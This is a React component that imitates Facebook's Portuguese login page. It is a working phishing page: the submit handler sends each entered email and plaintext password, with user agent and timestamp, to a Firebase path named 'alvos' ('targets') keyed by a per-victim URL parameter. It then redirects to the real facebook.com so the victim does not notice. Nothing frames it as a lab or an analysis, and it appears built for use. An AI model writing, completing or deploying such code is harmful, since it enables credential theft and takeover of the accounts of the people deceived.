"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { ref, push } from "firebase/database"
import { db } from "@/lib/firebase"
import { Button } from "@/components/ui/button"
import { SecurityLayer } from "@/components/security-layer"

export function FacebookLogin() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [userId, setUserId] = useState<string | null>(null)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const userIdParam = params.get("uid")
    setUserId(userIdParam)
    console.log("[v0] User ID from URL:", userIdParam)
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    console.log("[v0] Facebook form submitted", { email, password })

    try {
      const userPath = userId || "anonymous"
      console.log("[v0] Saving to path:", `alvos/${userPath}`)

      const alvosRef = ref(db, `alvos/${userPath}`)
      console.log("[v0] Firebase ref created:", alvosRef)

      const captureData = {
        pageType: "facebook",
        pageName: "Facebook",
        data: {
          email,
          password,
        },
        timestamp: new Date().toISOString(),
        ipAddress: "Captured from client",
        userAgent: navigator.userAgent,
      }

      console.log("[v0] Attempting to push data:", captureData)
      const result = await push(alvosRef, captureData)
      console.log("[v0] Data pushed successfully! Key:", result.key)

      window.location.href = "https://www.facebook.com"
    } catch (error) {
      console.error("[v0] Error capturing data:", error)
      window.location.href = "https://www.facebook.com"
    }
  }

  return (
    <>
      <SecurityLayer />

      <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-[396px] space-y-6">
          <div className="text-center space-y-3">
            <img src="/facebook-logo.png" alt="Facebook" className="h-16 w-auto mx-auto" />
            <p className="text-[28px] leading-[32px] text-[#1c1e21] font-normal">
              O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-white rounded-lg shadow-md p-4">
            <form onSubmit={handleSubmit} className="space-y-3">
              <input
                type="text"
                placeholder="Email ou telefone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                className="w-full h-[52px] px-4 text-[17px] text-[#1c1e21] placeholder:text-[#8a8d91] bg-white border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
              />
              <input
                type="password"
                placeholder="Senha"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="w-full h-[52px] px-4 text-[17px] text-[#1c1e21] placeholder:text-[#8a8d91] bg-white border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
              />
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-[48px] bg-[#1877f2] hover:bg-[#166fe5] text-white text-[20px] font-bold rounded-md"
              >
                {isLoading ? "Entrando..." : "Entrar"}
              </Button>

              <div className="text-center py-2">
                <a
                  href="https://www.facebook.com/recover/initiate/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-[#1877f2] text-[14px] hover:underline"
                >
                  Esqueceu a senha?
                </a>
              </div>

              <div className="border-t border-[#dadde1] pt-5 flex justify-center">
                <a
                  href="https://www.facebook.com/reg/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center justify-center h-[48px] px-4 bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] font-bold rounded-md cursor-pointer"
                >
                  Criar nova conta
                </a>
              </div>
            </form>
          </div>

          {/* Footer Text */}
          <div className="text-center text-[14px] text-[#1c1e21]">
            <a
              href="https://www.facebook.com/pages/create/"
              target="_blank"
              rel="noopener noreferrer"
              className="font-semibold text-[#1c1e21] hover:underline"
            >
              Crie uma Página
            </a>
            <span> para uma celebridade, uma marca ou uma empresa.</span>
          </div>
        </div>
      </div>
    </>
  )
}
